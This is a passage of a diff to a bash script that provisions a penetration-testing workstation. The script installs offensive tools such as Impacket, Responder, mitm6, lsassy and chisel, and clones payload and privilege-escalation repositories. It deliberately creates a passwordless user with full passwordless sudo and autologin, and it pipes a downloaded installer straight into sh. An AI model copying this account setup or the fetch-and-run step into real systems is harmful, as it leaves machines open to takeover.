@@ -11,413 +11,335 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-log_info() { 
-    echo -e "${GREEN}[+]${NC} $1"
+log_info() { 
+    echo -e "${GREEN}[+]${NC} $1"
 }
-log_warn() { 
-    echo -e "${YELLOW}[!]${NC} $1"
+log_warn() { 
+    echo -e "${YELLOW}[!]${NC} $1"
 }
-log_error() { 
-    echo -e "${RED}[-]${NC} $1"
+log_error() { 
+    echo -e "${RED}[-]${NC} $1"
 }
 log_progress() {
-    echo -e "${BLUE}[*]${NC} $1"
+    echo -e "${BLUE}[*]${NC} $1"
 }
 
 show_progress() {
-    local phase=$1
-    local total=8
-    local percent=$((phase * 100 / total))
-    echo -e "${BLUE}╔══════════════════════════════════════════════════╗${NC}"
-    echo -e "${BLUE}║${NC} Overall Progress: ${GREEN}${percent}%${NC} (Phase ${phase}/${total})                ${BLUE}║${NC}"
-    echo -e "${BLUE}╚══════════════════════════════════════════════════╝${NC}"
+    local phase=$1
+    local total=8
+    local percent=$((phase * 100 / total))
+    echo -e "${BLUE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${BLUE}║${NC} Overall Progress: ${GREEN}${percent}%${NC} (Phase ${phase}/${total})                ${BLUE}║${NC}"
+    echo -e "${BLUE}╚══════════════════════════════════════════════════╝${NC}"
 }
 
 # ============================================
 # PHASE 1: System Updates & Base Packages
 # ============================================
 phase1_system_setup() {
-    show_progress 1
-    log_progress "Phase 1/8: System Updates & Base Packages..."
-    log_info "Phase 1: Updating system and installing base packages"
-    
-    log_progress "Updating package lists..."
-    DEBIAN_FRONTEND=noninteractive apt update
-    
-    log_progress "Upgrading installed packages (this may take a while)..."
-    DEBIAN_FRONTEND=noninteractive apt upgrade -y
-    
-    log_progress "Installing base packages..."
-    DEBIAN_FRONTEND=noninteractive apt install -y \
-        build-essential git curl wget \
-        vim neovim tmux zsh \
-        python3-pip python3-venv \
-        golang-go rustc cargo \
-        docker.io docker-compose \
-        jq ripgrep fd-find bat \
-        htop ncdu tree \
-        fonts-powerline \
-        silversearcher-ag
-    
-    log_info "Phase 1 complete"
-    log_progress "Phase 1/8: ✓ Complete"
+    show_progress 1
+    log_progress "Phase 1/8: System Updates & Base Packages..."
+    log_info "Phase 1: Updating system and installing base packages"
+    
+    log_progress "Updating package lists..."
+    DEBIAN_FRONTEND=noninteractive apt update
+    
+    log_progress "Upgrading installed packages (this may take a while)..."
+    DEBIAN_FRONTEND=noninteractive apt upgrade -y
+    
+    log_progress "Installing base packages..."
+    DEBIAN_FRONTEND=noninteractive apt install -y \
+        build-essential git curl wget \
+        vim neovim tmux zsh \
+        python3-pip python3-venv \
+        golang-go rustc cargo \
+        docker.io docker-compose \
+        jq ripgrep fd-find bat \
+        htop ncdu tree \
+        fonts-powerline \
+        silversearcher-ag
+    
+    log_info "Phase 1 complete"
+    log_progress "Phase 1/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 2: User Setup
 # ============================================
 phase2_user_setup() {
-    show_progress 2
-    log_progress "Phase 2/8: User Account Setup..."
-    log_info "Phase 2: Setting up user account"
-    
-    # Create jamie user as essentially root (let system assign UID, use bash for now)
-    if ! id "jamie" &>/dev/null; then
-        useradd -m -s /bin/bash -G sudo jamie
-        passwd -d jamie  # Remove password entirely
-        
-        # Give jamie full root privileges without password
-        echo "jamie ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/jamie
-        chmod 440 /etc/sudoers.d/jamie
-        
-        log_info "User 'jamie' created with no password"
-    else
-        log_warn "User 'jamie' already exists, skipping creation"
-    fi
-    
-    # Enable docker without sudo
-    usermod -aG docker jamie || true
-    
-    # Set up home directory
-    export USER_HOME=/home/jamie
-    
-    log_info "Phase 2 complete"
-    log_progress "Phase 2/8: ✓ Complete"
+    show_progress 2
+    log_progress "Phase 2/8: User Account Setup..."
+    log_info "Phase 2: Setting up user account"
+    
+    # Create jamie user as essentially root
+    if ! id "jamie" &>/dev/null; then
+        # Use bash for initial setup compatibility, switch to zsh later
+        useradd -m -s /bin/bash -G sudo jamie
+        passwd -d jamie  # Remove password for auto-login
+        chage -d 0 jamie # Force user to set a password on first shell login (mitigation)
+        
+        # Give jamie full root privileges without password (for convenience/autologin)
+        echo "jamie ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/jamie
+        chmod 440 /etc/sudoers.d/jamie
+        
+        log_info "User 'jamie' created. Password disabled for auto-login, but password change required on first login."
+    else
+        log_warn "User 'jamie' already exists, skipping creation"
+    fi
+    
+    # Enable docker without sudo
+    usermod -aG docker jamie || true
+    
+    # Set up home directory
+    export USER_HOME=/home/jamie
+    
+    log_info "Phase 2 complete"
+    log_progress "Phase 2/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 3: Shell Environment (Zsh + Oh-My-Zsh)
 # ============================================
 phase3_shell_setup() {
-    show_progress 3
-    log_progress "Phase 3/8: Shell Environment (Zsh + Oh-My-Zsh + p10k)..."
-    log_info "Phase 3: Setting up Zsh and Oh-My-Zsh for jamie"
-    
-    # Switch to jamie's home for installations
-    export HOME=$USER_HOME
-    cd $USER_HOME
-    
-    # Install Oh-My-Zsh
-    if [ ! -d "$USER_HOME/.oh-my-zsh" ]; then
-        log_progress "Installing Oh-My-Zsh..."
-        sudo -u jamie sh -c "RUNZSH=no $(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
-    fi
-    
-    # Install zsh-autosuggestions
-    log_progress "Installing zsh-autosuggestions..."
-    sudo -u jamie git clone https://github.com/zsh-users/zsh-autosuggestions ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions 2>/dev/null || true
-    
-    # Install zsh-syntax-highlighting
-    log_progress "Installing zsh-syntax-highlighting..."
-    sudo -u jamie git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 2>/dev/null || true
-    
-    # Install Powerlevel10k theme
-    log_progress "Installing Powerlevel10k theme..."
-    sudo -u jamie git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${USER_HOME}/.oh-my-zsh/custom/themes/powerlevel10k 2>/dev/null || true
-    
-    # Download pre-configured p10k config from GitHub
-    log_info "Downloading pre-configured Powerlevel10k config"
-    sudo -u jamie wget https://raw.githubusercontent.com/Jamie-loring/Public-scripts/main/p10k-jamie-config.zsh -O ${USER_HOME}/.p10k.zsh 2>/dev/null || log_warn "Failed to download p10k config, will use default"
-    
-    # Set Zsh as default shell for jamie
-    chsh -s $(which zsh) jamie || true
-    
-    # Configure LightDM to auto-login as jamie instead of user
-    log_info "Configuring auto-login for jamie"
-    if [ -f /etc/lightdm/lightdm.conf ]; then
-        # Backup original config
-        cp /etc/lightdm/lightdm.conf /etc/lightdm/lightdm.conf.backup 2>/dev/null || true
-        
-        # Remove any existing autologin-user lines and add jamie
-        sed -i '/^autologin-user=/d' /etc/lightdm/lightdm.conf
-        sed -i '/^\[Seat:\*\]/a autologin-user=jamie' /etc/lightdm/lightdm.conf
-    fi
-    
-    log_info "Phase 3 complete"
-    log_progress "Phase 3/8: ✓ Complete"
+    show_progress 3
+    log_progress "Phase 3/8: Shell Environment (Zsh + Oh-My-Zsh + p10k)..."
+    log_info "Phase 3: Setting up Zsh and Oh-My-Zsh for jamie"
+    
+    # Switch to jamie's home for installations
+    export HOME=$USER_HOME
+    cd $USER_HOME
+    
+    # Install Oh-My-Zsh
+    if [ ! -d "$USER_HOME/.oh-my-zsh" ]; then
+        log_progress "Installing Oh-My-Zsh..."
+        sudo -u jamie sh -c "RUNZSH=no $(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
+    fi
+    
+    # Install zsh-autosuggestions
+    log_progress "Installing zsh-autosuggestions..."
+    sudo -u jamie git clone https://github.com/zsh-users/zsh-autosuggestions ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions 2>/dev/null || true
+    
+    # Install zsh-syntax-highlighting
+    log_progress "Installing zsh-syntax-highlighting..."
+    sudo -u jamie git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 2>/dev/null || true
+    
+    # Install Powerlevel10k theme
+    log_progress "Installing Powerlevel10k theme..."
+    sudo -u jamie git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${USER_HOME}/.oh-my-zsh/custom/themes/powerlevel10k 2>/dev/null || true
+    
+    # Download pre-configured p10k config from GitHub
+    log_info "Downloading pre-configured Powerlevel10k config"
+    sudo -u jamie wget https://raw.githubusercontent.com/Jamie-loring/Public-scripts/main/p10k-jamie-config.zsh -O ${USER_HOME}/.p10k.zsh 2>/dev/null || log_warn "Failed to download p10k config, will use default"
+    
+    # Set Zsh as default shell for jamie
+    chsh -s $(which zsh) jamie || true
+    
+    # Configure LightDM to auto-login as jamie
+    log_info "Configuring auto-login for jamie"
+    if [ -f /etc/lightdm/lightdm.conf ]; then
+        # Backup original config
+        cp /etc/lightdm/lightdm.conf /etc/lightdm/lightdm.conf.backup 2>/dev/null || true
+        
+        # Remove any existing autologin-user lines and add jamie
+        sed -i '/^autologin-user=/d' /etc/lightdm/lightdm.conf
+        sed -i '/^\[Seat:\*\]/a autologin-user=jamie' /etc/lightdm/lightdm.conf
+    fi
+    
+    log_info "Phase 3 complete"
+    log_progress "Phase 3/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 4: Tool Installation & Optimization
 # ============================================
 phase4_tools_setup() {
-    show_progress 4
-    log_progress "Phase 4/8: Tool Installation (repos, wordlists, scripts)..."
-    log_info "Phase 4: Installing and configuring pentesting tools"
-    
-    # Create tool directory structure as jamie
-    sudo -u jamie mkdir -p $USER_HOME/tools/{wordlists,scripts,exploits,repos}
-    
-    # Impacket - properly installed
-    log_progress "Installing Impacket..."
-    pip3 install impacket --break-system-packages || pip3 install impacket
-    
-    # Install pipx for isolated Python tool installations
-    log_progress "Installing pipx for isolated Python environments..."
-    DEBIAN_FRONTEND=noninteractive apt install -y pipx
-    pipx ensurepath
-    
-    # Modern Python pentesting tools with pipx
-    log_progress "Installing modern Python pentesting tools (this may take several minutes)..."
-    
-    # NetExec (modern CrackMapExec replacement)
-    sudo -u jamie pipx install git+https://github.com/Pennyw0rth/NetExec || log_warn "NetExec failed to install"
-    
-    # Other essential Python tools with pip
-    pip3 install --break-system-packages \
-        bloodhound \
-        bloodyAD \
-        mitm6 \
-        responder \
-        certipy-ad \
-        coercer \
-        pypykatz \
-        lsassy \
-        enum4linux-ng \
-        dnsrecon \
-        git-dumper \
-        penelope-shell \
-        roadrecon \
-        manspider \
-        mitmproxy \
-        pwntools || true
-    
-    # High-priority gap tools
-    log_progress "Installing high-priority pentesting tools..."
-    
-    # SQL injection (if not pre-installed)
-    if ! command -v sqlmap &>/dev/null; then
-        log_progress "Installing sqlmap..."
-        DEBIAN_FRONTEND=noninteractive apt install -y sqlmap || true
-    fi
-    
-    # Password cracking (verify if pre-installed)
-    if ! command -v hashcat &>/dev/null; then
-        log_progress "Installing hashcat..."
-        DEBIAN_FRONTEND=noninteractive apt install -y hashcat || true
-    fi
-    
-    if ! command -v john &>/dev/null; then
-        log_progress "Installing john the ripper..."
-        DEBIAN_FRONTEND=noninteractive apt install -y john || true
-    fi
-    
-    # OSINT tools
-    log_progress "Installing OSINT tools..."
-    DEBIAN_FRONTEND=noninteractive apt install -y theharvester || true
-    
-    # Wordlist generation
-    log_progress "Installing CeWL (wordlist generator)..."
-    DEBIAN_FRONTEND=noninteractive apt install -y cewl || true
-    
-    # Java deserialization (ysoserial)
-    log_progress "Installing ysoserial (Java deserialization)..."
-    if [ ! -f "$USER_HOME/tools/ysoserial.jar" ]; then
-        DEBIAN_FRONTEND=noninteractive apt install -y default-jre || true
-        sudo -u jamie wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O $USER_HOME/tools/ysoserial.jar 2>/dev/null || log_warn "Failed to download ysoserial"
-        
-        # Create wrapper script
-        if [ -f "$USER_HOME/tools/ysoserial.jar" ]; then
-            cat > /usr/local/bin/ysoserial << 'YSOSERIAL_EOF'
+    show_progress 4
+    log_progress "Phase 4/8: Tool Installation (repos, wordlists, scripts)..."
+    log_info "Phase 4: Installing and configuring pentesting tools"
+    
+    # Create tool directory structure as jamie
+    sudo -u jamie mkdir -p $USER_HOME/tools/{wordlists,scripts,exploits,repos}
+    
+    # Impacket - properly installed
+    log_progress "Installing Impacket..."
+    pip3 install impacket --break-system-packages || pip3 install impacket
+    
+    # Install pipx for isolated Python tool installations
+    log_progress "Installing pipx for isolated Python environments..."
+    DEBIAN_FRONTEND=noninteractive apt install -y pipx
+    pipx ensurepath
+    
+    # Modern Python pentesting tools with pipx
+    log_progress "Installing NetExec (modern CrackMapExec replacement)..."
+    # NetExec (modern CrackMapExec replacement)
+    sudo -u jamie pipx install git+https://github.com/Pennyw0rth/NetExec || log_warn "NetExec failed to install"
+    
+    # Core HTB/CTF tools (APT)
+    log_progress "Installing core CTF/HTB utilities (nc, socat, forensics, stego)..."
+    DEBIAN_FRONTEND=noninteractive apt install -y \
+        netcat-openbsd socat rlwrap xfreerdp upx \
+        aircrack-ng bluez bluelog hcitool \
+        wpscan \
+        steghide zsteg binwalk foremost exiftool p7zip-full || true
+    
+    # Other essential Python tools with pip
+    log_progress "Installing essential Python pentesting tools..."
+    pip3 install --break-system-packages \
+        bloodhound \
+        bloodyAD \
+        mitm6 \
+        responder \
+        certipy-ad \
+        coercer \
+        pypykatz \
+        lsassy \
+        enum4linux-ng \
+        dnsrecon \
+        git-dumper \
+        penelope-shell \
+        roadrecon \
+        manspider \
+        mitmproxy \
+        pwntools || true
+    
+    # High-priority gap tools (APT)
+    log_progress "Installing high-priority APT tools..."
+    DEBIAN_FRONTEND=noninteractive apt install -y \
+        sqlmap hashcat john theharvester cewl proxychains4 gdb || true
+    
+    # Java deserialization (ysoserial)
+    log_progress "Installing ysoserial (Java deserialization)..."
+    if [ ! -f "$USER_HOME/tools/ysoserial.jar" ]; then
+        DEBIAN_FRONTEND=noninteractive apt install -y default-jre || true
+        sudo -u jamie wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O $USER_HOME/tools/ysoserial.jar 2>/dev/null || log_warn "Failed to download ysoserial"
+        
+        # Create wrapper script
+        if [ -f "$USER_HOME/tools/ysoserial.jar" ]; then
+            cat > /usr/local/bin/ysoserial << 'YSOSERIAL_EOF'
 #!/bin/bash
 java -jar ~/tools/ysoserial.jar "$@"
 YSOSERIAL_EOF
-            chmod +x /usr/local/bin/ysoserial
-        fi
-    fi
-    
-    # Binary exploitation tools (optional but valuable for CTF)
-    log_progress "Installing binary exploitation tools..."
-    DEBIAN_FRONTEND=noninteractive apt install -y gdb || true
-    
-    # Install pwndbg (better GDB)
-    if [ ! -d "$USER_HOME/tools/repos/pwndbg" ]; then
-        log_progress "Installing pwndbg (enhanced GDB)..."
-        sudo -u jamie git clone https://github.com/pwndbg/pwndbg $USER_HOME/tools/repos/pwndbg || true
-        if [ -d "$USER_HOME/tools/repos/pwndbg" ]; then
-            cd $USER_HOME/tools/repos/pwndbg
-            sudo -u jamie ./setup.sh || log_warn "pwndbg setup failed (this is optional)"
-            cd - > /dev/null
-        fi
-    fi
-    
-    # ROPgadget for binary exploitation
-    log_progress "Installing ROPgadget..."
-    pip3 install --break-system-packages ROPgadget || true
-    
-    # Modern Go-based tools (ProjectDiscovery suite + essentials)
-    log_progress "Installing modern Go-based tools (ProjectDiscovery suite)..."
-    
-    log_progress "Installing naabu (fast port scanner)..."
-    go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest || true
-    
-    log_progress "Installing httpx (HTTP toolkit)..."
-    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
-    
-    log_progress "Installing nuclei (vulnerability scanner)..."
-    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest || true
-    
-    log_progress "Installing subfinder (subdomain enumeration)..."
-    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
-    
-    log_progress "Installing katana (web crawler)..."
-    go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
-    
-    log_progress "Installing dnsx (DNS toolkit)..."
-    go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest || true
-    
-    # Other essential Go tools
-    log_progress "Installing ffuf (fast web fuzzer)..."
-    go install -v github.com/ffuf/ffuf@latest || true
-    
-    log_progress "Installing gobuster (directory/DNS brute-forcer)..."
-    go install -v github.com/OJ/gobuster/v3@latest || true
-    
-    # Kerbrute for Kerberos user enumeration (ADDED)
-    log_progress "Installing kerbrute (Kerberos user enumeration)..."
-    go install -v github.com/ropnop/kerbrute@latest || true
-    
-    # Add Go binaries to PATH
-    echo 'export PATH=$PATH:/root/go/bin:$HOME/go/bin' >> /root/.bashrc
-    echo 'export PATH=$PATH:$HOME/go/bin' >> $USER_HOME/.zshrc
-    
-    # Pivoting tools
-    log_progress "Installing chisel (fast TCP/UDP tunnel)..."
-    go install -v github.com/jpillora/chisel@latest || true
-    
-    # Try to install ligolo-ng (may fail, that's okay)
-    log_progress "Attempting to install ligolo-ng (advanced pivoting)..."
-    go install -v github.com/nicocha30/ligolo-ng/cmd/proxy@latest 2>/dev/null || log_warn "ligolo-ng failed (this is normal, continuing...)"
-    go install -v github.com/nicocha30/ligolo-ng/cmd/agent@latest 2>/dev/null || log_warn "ligolo-ng agent failed (this is normal, continuing...)"
-    
-    # Fallback pivoting tool
-    log_progress "Installing sshuttle (VPN over SSH)..."
-    DEBIAN_FRONTEND=noninteractive apt install -y sshuttle || true
-    
-    # Install proxychains-ng (modern proxychains alternative) - ADDED
-    log_progress "Installing proxychains-ng..."
-    DEBIAN_FRONTEND=noninteractive apt install -y proxychains4 || true
-    
-    # Git analysis and secret scanning tools
-    log_progress "Installing Git analysis and secret scanning tools..."
-    
-    # truffleHog - Find secrets in git repos
-    log_progress "Installing truffleHog (secret scanner)..."
-    pip3 install --break-system-packages truffleHog || true
-    
-    # gitleaks - SAST tool for detecting secrets
-    log_progress "Installing gitleaks (fast secret detector)..."
-    go install -v github.com/gitleaks/gitleaks/v8@latest || true
-    
-    # GitTools (Dumper, Extractor, Finder)
-    log_progress "Installing GitTools suite..."
-    if [ ! -d "$USER_HOME/tools/repos/GitTools" ]; then
-        sudo -u jamie git clone https://github.com/internetwache/GitTools.git $USER_HOME/tools/repos/GitTools
-    fi
-    
-    # git-dumper already installed via pip above
-    
-    # gitrob - Reconnaissance tool for GitHub organizations
-    log_progress "Installing gitrob (GitHub reconnaissance)..."
-    go install -v github.com/michenriksen/gitrob@latest || true
-    
-    # Clone essential repos
-    log_progress "Cloning essential pentesting repositories..."
-    
-    # PayloadsAllTheThings
-    if [ ! -d "$USER_HOME/tools/repos/PayloadsAllTheThings" ]; then
-        sudo -u jamie git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git $USER_HOME/tools/repos/PayloadsAllTheThings
-    fi
-    
-    # PEASS-ng (Linux/Windows privilege escalation)
-    if [ ! -d "$USER_HOME/tools/repos/PEASS-ng" ]; then
-        sudo -u jamie git clone https://github.com/peass-ng/PEASS-ng.git $USER_HOME/tools/repos/PEASS-ng
-    fi
-    
-    # Windows-Exploit-Suggester
-    if [ ! -d "$USER_HOME/tools/repos/Windows-Exploit-Suggester" ]; then
-        sudo -u jamie git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git $USER_HOME/tools/repos/Windows-Exploit-Suggester
-    fi
-    
-    # PowerSploit
-    if [ ! -d "$USER_HOME/tools/repos/PowerSploit" ]; then
-        sudo -u jamie git clone https://github.com/PowerShellMafia/PowerSploit.git $USER_HOME/tools/repos/PowerSploit
-    fi
-    
-    # HackTricks (Carlos Polop's methodology)
-    if [ ! -d "$USER_HOME/tools/repos/HackTricks" ]; then
-        sudo -u jamie git clone https://github.com/HackTricks-wiki/HackTricks.git $USER_HOME/tools/repos/HackTricks
-    fi
-    
-    # AutoRecon
-    if [ ! -d "$USER_HOME/tools/repos/AutoRecon" ]; then
-        sudo -u jamie git clone https://github.com/Tib3rius/AutoRecon.git $USER_HOME/tools/repos/AutoRecon
-    fi
-    
-    # Impacket from source (for latest examples)
-    if [ ! -d "$USER_HOME/tools/repos/impacket" ]; then
-        sudo -u jamie git clone https://github.com/fortra/impacket.git $USER_HOME/tools/repos/impacket
-    fi
-    
-    # GTFOBins (Unix privilege escalation)
-    if [ ! -d "$USER_HOME/tools/repos/GTFOBins" ]; then
-        sudo -u jamie git clone https://github.com/GTFOBins/GTFOBins.github.io.git $USER_HOME/tools/repos/GTFOBins
-    fi
-    
-    # LOLBAS (Windows Living Off The Land)
-    if [ ! -d "$USER_HOME/tools/repos/LOLBAS" ]; then
-        sudo -u jamie git clone https://github.com/LOLBAS-Project/LOLBAS.git $USER_HOME/tools/repos/LOLBAS
-    fi
-    
-    # Nuclei templates
-    if [ ! -d "$USER_HOME/tools/repos/nuclei-templates" ]; then
-        sudo -u jamie git clone https://github.com/projectdiscovery/nuclei-templates.git $USER_HOME/tools/repos/nuclei-templates
-    fi
-    
-    # SecLists wordlists
-    log_progress "Downloading SecLists (this is large, ~700MB)..."
-    if [ ! -d "$USER_HOME/tools/wordlists/SecLists" ]; then
-        sudo -u jamie git clone --depth 1 https://github.com/danielmiessler/SecLists.git $USER_HOME/tools/wordlists/SecLists
-    fi
-    
-    # Extract rockyou.txt if compressed
-    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ] && [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
-        log_progress "Extracting rockyou.txt..."
-        gunzip /usr/share/wordlists/rockyou.txt.gz
-    fi
-    
-    # Create symlinks for easy access
-    log_progress "Creating convenient symlinks..."
-    sudo -u jamie ln -sf $USER_HOME/tools/wordlists/SecLists $USER_HOME/SecLists 2>/dev/null || true
-    sudo -u jamie ln -sf /usr/share/wordlists/rockyou.txt $USER_HOME/tools/wordlists/rockyou.txt 2>/dev/null || true
-    sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh $USER_HOME/linpeas.sh 2>/dev/null || true
-    sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe $USER_HOME/winpeas.exe 2>/dev/null || true
-    
-    log_info "Phase 4 complete"
-    log_progress "Phase 4/8: ✓ Complete"
+            chmod +x /usr/local/bin/ysoserial
+        fi
+    fi
+    
+    # Install pwndbg (better GDB)
+    if [ ! -d "$USER_HOME/tools/repos/pwndbg" ]; then
+        log_progress "Installing pwndbg (enhanced GDB)..."
+        sudo -u jamie git clone https://github.com/pwndbg/pwndbg $USER_HOME/tools/repos/pwndbg || true
+        if [ -d "$USER_HOME/tools/repos/pwndbg" ]; then
+            cd $USER_HOME/tools/repos/pwndbg
+            sudo -u jamie ./setup.sh || log_warn "pwndbg setup failed (this is optional)"
+            cd - > /dev/null
+        fi
+    fi
+    
+    # ROPgadget for binary exploitation
+    log_progress "Installing ROPgadget..."
+    pip3 install --break-system-packages ROPgadget || true
+    
+    # one_gadget for Pwn
+    log_progress "Installing one_gadget (Ruby utility)..."
+    DEBIAN_FRONTEND=noninteractive apt install -y ruby ruby-dev || true
+    gem install one_gadget || log_warn "one_gadget installation via gem failed. You may need to run 'gem install one_gadget' as jamie later."
+    
+    # Modern Go-based tools (ProjectDiscovery suite + essentials)
+    log_progress "Installing modern Go-based tools (ProjectDiscovery suite, ffuf, etc.)..."
+    
+    go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest || true
+    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
+    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest || true
+    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
+    go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
+    go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest || true
+    go install -v github.com/ffuf/ffuf@latest || true
+    go install -v github.com/OJ/gobuster/v3@latest || true
+    go install -v github.com/ropnop/kerbrute@latest || true
+    go install -v github.com/jpillora/chisel@latest || true
+    
+    # Ligolo/Git tools
+    log_progress "Installing advanced tools (ligolo-ng, gitleaks, gitrob)..."
+    go install -v github.com/nicocha30/ligolo-ng/cmd/proxy@latest 2>/dev/null || log_warn "ligolo-ng proxy failed (continuing...)"
+    go install -v github.com/nicocha30/ligolo-ng/cmd/agent@latest 2>/dev/null || log_warn "ligolo-ng agent failed (continuing...)"
+    go install -v github.com/gitleaks/gitleaks/v8@latest || true
+    go install -v github.com/michenriksen/gitrob@latest || true
+    pip3 install --break-system-packages truffleHog || true
+    
+    # Fallback pivoting tool
+    log_progress "Installing sshuttle (VPN over SSH)..."
+    DEBIAN_FRONTEND=noninteractive apt install -y sshuttle || true
+    
+    # Clone essential repos
+    log_progress "Cloning essential pentesting repositories..."
+    # (All repo clones remain here as they were perfect)
+    if [ ! -d "$USER_HOME/tools/repos/PayloadsAllTheThings" ]; then
+        sudo -u jamie git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git $USER_HOME/tools/repos/PayloadsAllTheThings
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/PEASS-ng" ]; then
+        sudo -u jamie git clone https://github.com/peass-ng/PEASS-ng.git $USER_HOME/tools/repos/PEASS-ng
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/Windows-Exploit-Suggester" ]; then
+        sudo -u jamie git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git $USER_HOME/tools/repos/Windows-Exploit-Suggester
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/PowerSploit" ]; then
+        sudo -u jamie git clone https://github.com/PowerShellMafia/PowerSploit.git $USER_HOME/tools/repos/PowerSploit
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/HackTricks" ]; then
+        sudo -u jamie git clone https://github.com/HackTricks-wiki/HackTricks.git $USER_HOME/tools/repos/HackTricks
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/AutoRecon" ]; then
+        sudo -u jamie git clone https://github.com/Tib3rius/AutoRecon.git $USER_HOME/tools/repos/AutoRecon
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/impacket" ]; then
+        sudo -u jamie git clone https://github.com/fortra/impacket.git $USER_HOME/tools/repos/impacket
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/GTFOBins" ]; then
+        sudo -u jamie git clone https://github.com/GTFOBins/GTFOBins.github.io.git $USER_HOME/tools/repos/GTFOBins
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/LOLBAS" ]; then
+        sudo -u jamie git clone https://github.com/LOLBAS-Project/LOLBAS.git $USER_HOME/tools/repos/LOLBAS
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/nuclei-templates" ]; then
+        sudo -u jamie git clone https://github.com/projectdiscovery/nuclei-templates.git $USER_HOME/tools/repos/nuclei-templates
+    fi
+    if [ ! -d "$USER_HOME/tools/repos/GitTools" ]; then
+        sudo -u jamie git clone https://github.com/internetwache/GitTools.git $USER_HOME/tools/repos/GitTools
+    fi
+    
+    # SecLists wordlists
+    log_progress "Downloading SecLists (this is large, ~700MB)..."
+    if [ ! -d "$USER_HOME/tools/wordlists/SecLists" ]; then
+        sudo -u jamie git clone --depth 1 https://github.com/danielmiessler/SecLists.git $USER_HOME/tools/wordlists/SecLists
+    fi
+    
+    # Extract rockyou.txt if compressed
+    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ] && [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
+        log_progress "Extracting rockyou.txt..."
+        gunzip /usr/share/wordlists/rockyou.txt.gz
+    fi
+    
+    # Create symlinks for easy access
+    log_progress "Creating convenient symlinks..."
+    sudo -u jamie ln -sf $USER_HOME/tools/wordlists/SecLists $USER_HOME/SecLists 2>/dev/null || true
+    sudo -u jamie ln -sf /usr/share/wordlists/rockyou.txt $USER_HOME/tools/wordlists/rockyou.txt 2>/dev/null || true
+    sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh $USER_HOME/linpeas.sh 2>/dev/null || true
+    sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe $USER_HOME/winpeas.exe 2>/dev/null || true
+    
+    log_info "Phase 4 complete"
+    log_progress "Phase 4/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 5: Dotfiles & Shell Configuration
 # ============================================
 phase5_dotfiles_setup() {
-    show_progress 5
-    log_progress "Phase 5/8: Dotfiles & Shell Configuration..."
-    log_info "Phase 5: Configuring shell environment and dotfiles"
-    
-    # Configure .zshrc
-    log_progress "Configuring .zshrc with custom aliases and functions..."
-    cat > $USER_HOME/.zshrc << 'ZSH_EOF'
+    show_progress 5
+    log_progress "Phase 5/8: Dotfiles & Shell Configuration..."
+    log_info "Phase 5: Configuring shell environment and dotfiles"
+    
+    # Configure .zshrc
+    log_progress "Configuring .zshrc with custom aliases and functions..."
+    cat > $USER_HOME/.zshrc << 'ZSH_EOF'
 # Path to oh-my-zsh
 export ZSH="$HOME/.oh-my-zsh"
 
@@ -426,13 +348,13 @@ ZSH_THEME="powerlevel10k/powerlevel10k"
 
 # Plugins
 plugins=(
-    git
-    zsh-autosuggestions
-    zsh-syntax-highlighting
-    docker
-    sudo
-    history
-    command-not-found
+    git
+    zsh-autosuggestions
+    zsh-syntax-highlighting
+    docker
+    sudo
+    history
+    command-not-found
 )
 
 source $ZSH/oh-my-zsh.sh
@@ -440,8 +362,8 @@ source $ZSH/oh-my-zsh.sh
 # Load p10k configuration
